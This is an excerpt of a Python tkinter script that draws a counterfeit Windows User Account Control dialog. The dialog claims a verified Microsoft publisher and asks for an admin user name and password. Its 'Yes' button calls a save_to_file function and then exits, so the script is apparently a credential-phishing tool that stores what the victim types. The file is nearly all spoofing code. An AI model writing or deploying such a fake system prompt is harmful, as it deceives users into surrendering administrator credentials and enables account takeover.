...
#simple text labels
text_label1 = tk.Label(white_window, text="Do you want to allow this app to make", font=("Quebec Serial", 25), background='#76c7ed', foreground='black')
text_label2 = tk.Label(white_window, text="changes to your device?", font=("Quebec Serial", 25), background='#76c7ed', foreground='black')
text_label3 = tk.Label(white_window, text="User Account Control", font=("Arial", 14), background='#76c7ed', foreground='black')
text_label4 = tk.Label(white_window, text="Windows Command Processor", font=("Quebec Serial", 22), background='white', foreground='black')
text_label5 = tk.Label(white_window, text="Verified publisher: Microsoft Windows", font=("Quebec Serial", 16), background='white', foreground='black')
text_label6 = tk.Label(white_window, text="Show more details", font=("Quebec Serial", 16), background='white', foreground='#008ed7')
text_label7 = tk.Label(white_window, text="To continue, enter an admin user name and password.", font=("Quebec Serial", 16), background='white', foreground='black')
text_label8 = tk.Label(white_window, text="More choices", font=("Quebec Serial", 16), background='white', foreground='#008ed7')
...
yes_button = tk.Button(button_frame, text="Yes", width=27, height=1, bg="#B8B8B8", borderwidth=0, font=("Segoe UI", 16), background='#c1d7e8', foreground='black',command=lambda: (save_to_file(), exit_program()))
